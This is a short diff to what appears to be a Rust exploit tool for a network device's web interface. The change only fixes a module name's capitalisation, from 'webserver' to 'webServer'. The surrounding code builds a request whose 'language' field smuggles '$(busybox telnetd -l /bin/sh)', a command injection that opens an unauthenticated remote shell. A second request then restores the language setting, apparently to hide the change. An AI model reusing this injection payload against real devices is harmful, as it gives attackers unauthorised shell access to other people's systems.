@@ -137,14 +137,14 @@ async fn main()  {
 
 	let payload = Payload {
 		token: String::from(&token),
-		module: "webserver".to_string(),
+		module: "webServer".to_string(),
 		action: 1,
 		language: "$(busybox telnetd -l /bin/sh)".to_string()
 	};
 
 	let payload_restore_language = Payload {
 		token: String::from(&token),
-		module: "webserver".to_string(),
+		module: "webServer".to_string(),
 		action: 1,
 		language: "en".to_string()
 	};
